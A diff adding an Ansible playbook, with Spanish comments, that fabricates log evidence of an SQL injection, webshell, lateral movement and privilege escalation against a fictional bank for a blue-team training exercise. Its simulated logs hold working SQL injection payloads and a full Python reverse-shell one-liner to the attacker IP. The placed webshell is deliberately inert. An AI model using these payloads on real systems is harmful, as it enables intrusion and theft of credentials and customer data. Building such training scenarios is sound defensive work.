@@ -1,0 +1,865 @@
+---
+# ==============================================================================
+# Escenario 04 - Intrusion y Movimiento Lateral
+# Simulacion del Ataque - after_clone.yml
+# ==============================================================================
+# Este playbook simula la cadena de ataque completa contra la infraestructura
+# de Banco del Sol. Crea logs, archivos y eventos que los estudiantes deben
+# detectar y analizar como equipo de respuesta azul (blue team).
+#
+# IMPORTANTE: Este playbook se ejecuta DESPUES de base_config.yml y simula
+# las acciones del atacante en forma de logs y archivos de evidencia.
+#
+# Cadena de Ataque:
+#   Fase 1: Explotacion Web - Inyeccion SQL
+#   Fase 2: Punto de Apoyo Inicial - Webshell
+#   Fase 3: Movimiento Lateral
+#   Fase 4: Escalamiento de Privilegios
+# ==============================================================================
+
+- name: Simular Cadena de Ataque - Banco del Sol
+  hosts: localhost
+  become: no
+  gather_facts: no
+  connection: local
+
+  vars:
+    attack_start_time: "{{ lookup('pipe', 'date -d \"1 hour ago\" +%Y-%m-%dT%H:%M:%S') }}"
+    attacker_ip: "10.10.1.100"
+    webserver_ip: "10.10.1.10"
+    database_ip: "10.10.2.30"
+    fileserver_ip: "10.10.2.20"
+    domaincontroller_ip: "10.10.0.10"
+    mailserver_ip: "10.10.2.10"
+    workstation_ip: "10.10.2.50"
+
+  tasks:
+    # ==========================================================================
+    # FASE 1: Explotacion Web - Inyeccion SQL
+    # ==========================================================================
+    - name: "FASE 1 - Iniciar simulacion de inyeccion SQL"
+      ansible.builtin.debug:
+        msg: |
+          ============================================
+          FASE 1: EXPLORACION Y EXPLOTACION WEB
+          ============================================
+          Atacante: {{ attacker_ip }}
+          Objetivo: {{ webserver_ip }}
+          Tecnica: T1190 - Exploit Public-Facing Application
+          ============================================
+
+    - name: "FASE 1.1 - Crear logs de escaneo inicial"
+      delegate_to: webserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/access.log
+        marker: "# {mark} ATTACK SCANNING PHASE"
+        insertafter: EOF
+        block: |
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET / HTTP/1.1" 200 4523
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /login.php HTTP/1.1" 200 2891
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2905
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /admin/ HTTP/1.1" 403 287
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /phpmyadmin/ HTTP/1.1" 404 199
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /wp-admin/ HTTP/1.1" 404 199
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /robots.txt HTTP/1.1" 200 123
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /.env HTTP/1.1" 403 287
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /config.php HTTP/1.1" 200 891
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /search.php HTTP/1.1" 200 1456
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /api/ HTTP/1.1" 404 199
+
+    - name: "FASE 1.2 - Crear logs de deteccion de SQLi - Login form"
+      delegate_to: webserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/access.log
+        marker: "# {mark} ATTACK SQLI LOGIN"
+        insertafter: EOF
+        block: |
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2905 "username=admin'%20OR%20'1'%3D'1&password=test" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2905 "username=admin'%20OR%201=1--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2905 "username=admin'/**/OR/**/1=1/**/&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2905 "username=admin'%20UNION%20SELECT%201,2,3,4,5--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+    - name: "FASE 1.3 - Crear logs de UNION-based SQLi"
+      delegate_to: webserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/access.log
+        marker: "# {mark} ATTACK UNION SQLI"
+        insertafter: EOF
+        block: |
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 3156 "username=admin'%20UNION%20SELECT%20username,password,email,5%20FROM%20system_users--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 3289 "username=admin'%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME,DATA_TYPE,4%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA='banco_del_sol'--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 2891 "username=admin'%20UNION%20SELECT%20nombre,email,numero_cuenta,saldo%20FROM%20customer_accounts--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "POST /login.php HTTP/1.1" 200 3012 "username=admin'%20UNION%20SELECT%20grantee,privilege_type,is_grantable,4%20FROM%20information_schema.USER_PRIVILEGES--%20&password=" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /search.php?q=BS-001'%20UNION%20SELECT%20username,password,numero_cuenta,saldo%20FROM%20customer_accounts-- HTTP/1.1" 200 1876 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ attack_start_time }}] "GET /search.php?q=BS-001'%20UNION%20SELECT%20database(),user(),version(),4-- HTTP/1.1" 200 1654 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+    - name: "FASE 1.4 - Crear logs de error-based SQLi"
+      delegate_to: webserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/error.log
+        marker: "# {mark} ATTACK SQLI ERRORS"
+        insertafter: EOF
+        block: |
+          [{{ attack_start_time }}] [error] [client {{ attacker_ip }}] PHP Warning: PDO::query(): SQLSTATE[42000]: Syntax error or access violation in /var/www/html/banco_del_sol/public/login.php on line 25
+          [{{ attack_start_time }}] [error] [client {{ attacker_ip }}] PHP Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error in /var/www/html/banco_del_sol/public/login.php:25 Stack trace: #0 /var/www/html/banco_del_sol/public/login.php(25): PDO->query('SELECT * FROM cu...') #1 {main} thrown in /var/www/html/banco_del_sol/public/login.php on line 25
+          [{{ attack_start_time }}] [error] [client {{ attacker_ip }}] PHP Warning: PDO::query(): SQLSTATE[42S02]: Base table or view not found: 1146 Table 'banco_del_sol.users' doesn't exist in /var/www/html/banco_del_sol/public/login.php on line 25
+
+    - name: "FASE 1.5 - Crear logs de la aplicacion con extraccion de datos"
+      delegate_to: webserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/www/html/banco_del_sol/logs/access.log
+        marker: "# {mark} ATTACK DATA EXTRACTION"
+        insertafter: EOF
+        block: |
+          {{ attack_start_time }} - Login attempt: user=admin' OR '1'='1 from={{ attacker_ip }} result=SUCCESS
+          {{ attack_start_time }} - Login attempt: user=admin'/**/OR/**/1=1/**/ from={{ attacker_ip }} result=SUCCESS
+          {{ attack_start_time }} - Login attempt: user=admin' UNION SELECT username,password,email,5 FROM system_users-- from={{ attacker_ip }} result=SUCCESS
+          {{ attack_start_time }} - SQL Query executed: SELECT * FROM customer_accounts WHERE username = 'admin' UNION SELECT username,password,email,5 FROM system_users--' from={{ attacker_ip }}
+          {{ attack_start_time }} - Data access: system_users table queried from={{ attacker_ip }}
+          {{ attack_start_time }} - Data access: customer_accounts table queried from={{ attacker_ip }}
+
+    - name: "FASE 1.6 - Crear logs de SQL errors en MySQL"
+      delegate_to: database
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/mysql/general.log
+        marker: "# {mark} ATTACK MYSQL QUERIES"
+        insertafter: EOF
+        block: |
+          {{ attack_start_time }}    10 Query     SELECT * FROM customer_accounts WHERE username = 'admin' OR '1'='1' AND password = 'test'
+          {{ attack_start_time }}    10 Query     SELECT * FROM customer_accounts WHERE username = 'admin'/**/OR/**/1=1/**/' AND password = ''
+          {{ attack_start_time }}    10 Query     SELECT * FROM customer_accounts WHERE username = 'admin' UNION SELECT 1,2,3,4,5-- ' AND password = ''
+          {{ attack_start_time }}    10 Query     SELECT * FROM customer_accounts WHERE username = 'admin' UNION SELECT username,password,email,5 FROM system_users-- ' AND password = ''
+          {{ attack_start_time }}    10 Query     SELECT TABLE_NAME,COLUMN_NAME,DATA_TYPE,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='banco_del_sol'
+          {{ attack_start_time }}    10 Query     SELECT nombre,email,numero_cuenta,saldo FROM customer_accounts WHERE nombre LIKE '%BS-001%' OR numero_cuenta LIKE '%BS-001%'
+          {{ attack_start_time }}    10 Query     SELECT database(),user(),version(),4
+          {{ attack_start_time }}    10 Query     SELECT username,password FROM system_users
+
+    - name: "FASE 1.7 - Crear logs de mysql error con SQLi"
+      delegate_to: database
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/mysql/error.log
+        marker: "# {mark} ATTACK MYSQL ERRORS"
+        insertafter: EOF
+        block: |
+          [ERROR] {{ attack_start_time }} [Warning] 1292 Truncated incorrect DOUBLE value: 'admin UNION SELECT username,password'
+          [Note] {{ attack_start_time }} [Note] Access denied for user 'bds_webapp'@'10.10.1.10' (using password: YES) -- attempting to create unauthorized connection
+
+# ==============================================================================
+# FASE 2: Punto de Apoyo Inicial - Webshell
+# ==============================================================================
+- name: "FASE 2 - Simular colocacion de webshell"
+  hosts: webserver
+  become: yes
+  gather_facts: yes
+  vars:
+    attacker_ip: "10.10.1.100"
+    webserver_ip: "10.10.1.10"
+    database_ip: "10.10.2.30"
+
+  tasks:
+    - name: "FASE 2 - Iniciar simulacion de webshell"
+      ansible.builtin.debug:
+        msg: |
+          ============================================
+          FASE 2: PUNTO DE APOYO INICIAL
+          ============================================
+          Atacante: {{ attacker_ip }}
+          Objetivo: {{ webserver_ip }}
+          Tecnica: T1505.003 - Server Software Component: Web Shell
+          ============================================
+
+    - name: "FASE 2.1 - Colocar webshell en directorio de uploads"
+      ansible.builtin.copy:
+        dest: "/var/www/html/banco_del_sol/uploads/shell.php"
+        owner: www-data
+        group: www-data
+        mode: "0644"
+        content: |
+          <?php
+          /**
+           * shell.php - Banco del Sol Online
+           * =================================
+           * Este archivo NO es un webshell real.
+           * Es una simulacion para fines educativos.
+           * Los comandos no se ejecutan realmente.
+           *
+           * Si encuentras este archivo, significa que
+           * el servidor ha sido comprometido.
+           */
+
+          // Simulacion de webshell - NO EJECUTA COMANDOS REALES
+          if (isset($_POST['cmd'])) {
+              $cmd = $_POST['cmd'];
+
+              // Log de la actividad maliciosa
+              $log_entry = date('Y-m-d H:i:s') . " - WEBSHELL ACCESS: cmd=" . $cmd . " from=" . $_SERVER['REMOTE_ADDR'];
+              error_log($log_entry, 3, "/var/www/html/banco_del_sol/logs/websell_activity.log");
+
+              // Respuesta simulada
+              echo "<pre>";
+              echo "Banco del Sol Online - Panel de Administracion\n";
+              echo "================================================\n";
+              echo "Comando: " . htmlspecialchars($cmd) . "\n";
+              echo "Usuario: www-data\n";
+              echo "Directorio: " . getcwd() . "\n";
+              echo "Fecha: " . date('Y-m-d H:i:s') . "\n";
+              echo "</pre>";
+          } elseif (isset($_GET['action'])) {
+              $action = $_GET['action'];
+
+              // Log de la actividad
+              $log_entry = date('Y-m-d H:i:s') . " - WEBSHELL ACTION: " . $action . " from=" . $_SERVER['REMOTE_ADDR'];
+              error_log($log_entry, 3, "/var/www/html/banco_del_sol/logs/websell_activity.log");
+
+              echo "<pre>";
+              echo "Banco del Sol Online - Sistema de Gestion\n";
+              echo "================================================\n";
+
+              switch($action) {
+                  case 'info':
+                      echo "Sistema: " . php_uname() . "\n";
+                      echo "PHP: " . phpversion() . "\n";
+                      echo "Servidor: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
+                      echo "Documento: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
+                      echo "Usuario: " . get_current_user() . "\n";
+                      break;
+                  case 'files':
+                      $files = scandir(getcwd());
+                      foreach ($files as $file) {
+                          echo $file . "\n";
+                      }
+                      break;
+                  default:
+                      echo "Acciones disponibles: info, files\n";
+              }
+              echo "</pre>";
+          } else {
+              // Pagina de login falsa
+              echo "<!DOCTYPE html>";
+              echo "<html><head><title>Banco del Sol - Sistema</title></head>";
+              echo "<body>";
+              echo "<h1>Banco del Sol Online</h1>";
+              echo "<p>Sistema de administracion en mantenimiento.</p>";
+              echo "</body></html>";
+          }
+          ?>
+
+    - name: "FASE 2.2 - Crear log de creacion del webshell"
+      ansible.builtin.blockinfile:
+        path: /var/www/html/banco_del_sol/logs/websell_activity.log
+        marker: "# {mark} WEBSHELL CREATION"
+        insertafter: EOF
+        block: |
+          {{ lookup('pipe', 'date -d \"59 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} - WEBSHELL CREATED: shell.php from={{ attacker_ip }}
+          {{ lookup('pipe', 'date -d \"59 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} - WEBSHELL: File created in /var/www/html/banco_del_sol/uploads/
+          {{ lookup('pipe', 'date -d \"59 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} - WEBSHELL: First access from {{ attacker_ip }}
+
+    - name: "FASE 2.3 - Crear logs de acceso al webshell en Apache"
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/access.log
+        marker: "# {mark} ATTACK WEBSHELL ACCESS"
+        insertafter: EOF
+        block: |
+          {{ attacker_ip }} - - [{{ lookup('pipe', 'date -d \"58 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}] "GET /uploads/shell.php HTTP/1.1" 200 892 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ lookup('pipe', 'date -d \"57 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}] "POST /uploads/shell.php HTTP/1.1" 200 456 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ lookup('pipe', 'date -d \"56 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}] "GET /uploads/shell.php?action=info HTTP/1.1" 200 789 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          {{ attacker_ip }} - - [{{ lookup('pipe', 'date -d \"55 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}] "GET /uploads/shell.php?action=files HTTP/1.1" 200 1234 "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+    - name: "FASE 2.4 - Simular reverse shell connection"
+      ansible.builtin.blockinfile:
+        path: /var/log/apache2/access.log
+        marker: "# {mark} ATTACK REVERSE SHELL"
+        insertafter: EOF
+        block: |
+          {{ attacker_ip }} - - [{{ lookup('pipe', 'date -d \"54 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}] "POST /uploads/shell.php HTTP/1.1" 200 1123 "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ attacker_ip }}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])" "Mozilla/5.0" -
+
+    - name: "FASE 2.5 - Crear archivos temporales sospechosos"
+      ansible.builtin.copy:
+        dest: "/tmp/.cache_backup"
+        owner: www-data
+        group: www-data
+        mode: "0600"
+        content: |
+          #!/bin/bash
+          # Simulacion de script de mantenimiento de acceso
+          # Este archivo NO ejecuta acciones reales
+          # Es evidencia de compromiso para fines educativos
+          echo "[Simulacion] Backdoor script ejecutado"
+          echo "[Simulacion] Fecha: $(date)"
+          echo "[Simulacion] IP atacante: {{ attacker_ip }}"
+          echo "[Simulacion] Esto es un ejercicio de ciberseguridad"
+
+    - name: "FASE 2.6 - Crear cron job sospechoso (simulado)"
+      ansible.builtin.blockinfile:
+        path: /var/log/auth.log
+        marker: "# {mark} ATTACK CRON"
+        insertafter: EOF
+        block: |
+          {{ lookup('pipe', 'date -d \"53 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} webserver CRON[12345]: (www-data) CMD (/tmp/.cache_backup > /dev/null 2>&1)
+
+# ==============================================================================
+# FASE 3: Movimiento Lateral
+# ==============================================================================
+- name: "FASE 3 - Simular movimiento lateral"
+  hosts: localhost
+  become: no
+  gather_facts: no
+  connection: local
+
+  vars:
+    attacker_ip: "10.10.1.100"
+    webserver_ip: "10.10.1.10"
+    database_ip: "10.10.2.30"
+    fileserver_ip: "10.10.2.20"
+    domaincontroller_ip: "10.10.0.10"
+    db_password: "W3bApp_D3l_Sol_2024!"
+
+  tasks:
+    - name: "FASE 3 - Iniciar simulacion de movimiento lateral"
+      ansible.builtin.debug:
+        msg: |
+          ============================================
+          FASE 3: MOVIMIENTO LATERAL
+          ============================================
+          Origen: {{ webserver_ip }}
+          Objetivos: {{ database_ip }}, {{ fileserver_ip }}
+          Tecnica: T1021 - Remote Services
+          ============================================
+
+    - name: "FASE 3.1 - Simular acceso SSH desde webserver a database"
+      delegate_to: database
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/auth.log
+        marker: "# {mark} ATTACK SSH LATERAL MOVEMENT"
+        insertafter: EOF
+        block: |
+          {{ lookup('pipe', 'date -d \"52 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} database sshd[23456]: Accepted password for bds_webapp from {{ webserver_ip }} port 44321 ssh2
+          {{ lookup('pipe', 'date -d \"52 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} database sshd[23456]: pam_unix(sshd:session): session opened for user bds_webapp(uid=1001) by (uid=0)
+
+    - name: "FASE 3.2 - Simular queries desde webserver en database"
+      delegate_to: database
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/mysql/general.log
+        marker: "# {mark} ATTACK DB LATERAL QUERIES"
+        insertafter: EOF
+        block: |
+          {{ lookup('pipe', 'date -d \"51 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT user, host, plugin FROM mysql.user
+          {{ lookup('pipe', 'date -d \"51 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT @@datadir
+          {{ lookup('pipe', 'date -d \"50 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT User, authentication_string FROM mysql.user
+          {{ lookup('pipe', 'date -d \"49 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT * FROM mysql.db WHERE User='bds_webapp'
+          {{ lookup('pipe', 'date -d \"48 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SHOW DATABASES
+          {{ lookup('pipe', 'date -d \"47 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT username, password FROM system_users
+          {{ lookup('pipe', 'date -d \"46 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}    12 Query     SELECT * FROM customer_accounts LIMIT 10
+
+    - name: "FASE 3.3 - Simular conexiones SMB desde webserver a fileserver"
+      delegate_to: fileserver
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4624
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4624</EventID>
+              <Version>2</Version>
+              <Level>0</Level>
+              <Task>12544</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"45 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>100001</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>fileserver.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-0-0</Data>
+              <Data Name='SubjectUserName'>-</Data>
+              <Data Name='SubjectDomainName'>-</Data>
+              <Data Name='SubjectLogonId'>0x0</Data>
+              <Data Name='TargetUserSid'>S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
+              <Data Name='TargetUserName'>svc_fileserver</Data>
+              <Data Name='TargetDomainName'>banco-dsol</Data>
+              <Data Name='TargetLogonId'>0x1234567</Data>
+              <Data Name='LogonType'>3</Data>
+              <Data Name='CapturedPrincipalLogonId'>0x0</Data>
+              <Data Name='PreviousLoginTime'>0000-00-00T00:00:00.0000000Z</Data>
+              <Data Name='PreviousLoginAccount'>-</Data>
+              <Data Name='IpAddress'>{{ webserver_ip }}</Data>
+              <Data Name='IpPort'>44322</Data>
+              <Data Name='WorkstationName'>webserver</Data>
+              <Data Name='LogonGuid'>{00000000-0000-0000-0000-000000000000}</Data>
+              <Data Name='TransmittedServices'>-</Data>
+              <Data Name='LmPackage'>-</Data>
+              <Data Name='KeyLength'>0</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 3.4 - Simular enumeracion de shares SMB"
+      delegate_to: fileserver
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 5140
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>5140</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>12800</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"44 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>100002</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>fileserver.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
+              <Data Name='SubjectUserName'>svc_fileserver</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x1234567</Data>
+              <Data Name='ObjectType'>File</Data>
+              <Data Name='IpAddress'>{{ webserver_ip }}</Data>
+              <Data Name='IpPort'>44322</Data>
+              <Data Name='ShareName'>\\\\*\\IT</Data>
+              <Data Name='ShareLocalPath'>C:\\Compartidos\\IT</Data>
+              <Data Name='RelativeTargetName'>config_servidores.txt</Data>
+              <Data Name='AccessMask'>0x120089</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 3.5 - Simular lectura de archivo de credenciales"
+      delegate_to: fileserver
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 5145
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>5145</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>12800</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"43 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>100003</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>fileserver.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserName'>svc_fileserver</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x1234567</Data>
+              <Data Name='IpAddress'>{{ webserver_ip }}</Data>
+              <Data Name='IpPort'>44322</Data>
+              <Data Name='ShareName'>\\\\*\\IT</Data>
+              <Data Name='ShareLocalPath'>C:\\Compartidos\\IT</Data>
+              <Data Name='RelativeTargetName'>config_servidores.txt</Data>
+              <Data Name='AccessMask'>0x120089</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 3.6 - Simular acceso RDP desde webserver"
+      delegate_to: fileserver
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4624
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4624</EventID>
+              <Version>2</Version>
+              <Level>0</Level>
+              <Task>12544</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"42 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>100004</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>fileserver.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-0-0</Data>
+              <Data Name='SubjectUserName'>-</Data>
+              <Data Name='SubjectDomainName'>-</Data>
+              <Data Name='SubjectLogonId'>0x0</Data>
+              <Data Name='TargetUserSid'>S-1-5-21-1234567890-1234567890-1234567890-1001</Data>
+              <Data Name='TargetUserName'>svc_fileserver</Data>
+              <Data Name='TargetDomainName'>banco-dsol</Data>
+              <Data Name='TargetLogonId'>0x1234568</Data>
+              <Data Name='LogonType'>10</Data>
+              <Data Name='IpAddress'>{{ webserver_ip }}</Data>
+              <Data Name='IpPort'>44323</Data>
+              <Data Name='WorkstationName'>WEBSERVER</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 3.7 - Simular acceso a mailserver desde webserver"
+      delegate_to: mailserver
+      become: yes
+      ansible.builtin.blockinfile:
+        path: /var/log/auth.log
+        marker: "# {mark} ATTACK SSH MAILSERVER"
+        insertafter: EOF
+        block: |
+          {{ lookup('pipe', 'date -d \"41 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} mailserver sshd[34567]: Accepted password for bds_webapp from {{ webserver_ip }} port 44324 ssh2
+          {{ lookup('pipe', 'date -d \"41 minutes ago\" +%Y-%m-%dT%H:%M:%S') }} mailserver sshd[34567]: pam_unix(sshd:session): session opened for user bds_webapp(uid=1001) by (uid=0)
+
+# ==============================================================================
+# FASE 4: Escalamiento de Privilegios
+# ==============================================================================
+- name: "FASE 4 - Simular escalamiento de privilegios"
+  hosts: localhost
+  become: no
+  gather_facts: no
+  connection: local
+
+  vars:
+    attacker_ip: "10.10.1.100"
+    webserver_ip: "10.10.1.10"
+    database_ip: "10.10.2.30"
+    fileserver_ip: "10.10.2.20"
+    domaincontroller_ip: "10.10.0.10"
+
+  tasks:
+    - name: "FASE 4 - Iniciar simulacion de escalamiento"
+      ansible.builtin.debug:
+        msg: |
+          ============================================
+          FASE 4: ESCALAMIENTO DE PRIVILEGIOS
+          ============================================
+          Origen: {{ fileserver_ip }}
+          Objetivo: {{ domaincontroller_ip }}
+          Tecnica: T1078 - Valid Accounts
+          ============================================
+
+    - name: "FASE 4.1 - Simular logon en domaincontroller desde fileserver"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4624
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4624</EventID>
+              <Version>2</Version>
+              <Level>0</Level>
+              <Task>12544</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"40 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200001</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-0-0</Data>
+              <Data Name='SubjectUserName'>-</Data>
+              <Data Name='SubjectDomainName'>-</Data>
+              <Data Name='SubjectLogonId'>0x0</Data>
+              <Data Name='TargetUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='TargetUserName'>Administrator</Data>
+              <Data Name='TargetDomainName'>banco-dsol</Data>
+              <Data Name='TargetLogonId'>0x2345678</Data>
+              <Data Name='LogonType'>3</Data>
+              <Data Name='IpAddress'>{{ fileserver_ip }}</Data>
+              <Data Name='IpPort'>44325</Data>
+              <Data Name='WorkstationName'>fileserver</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
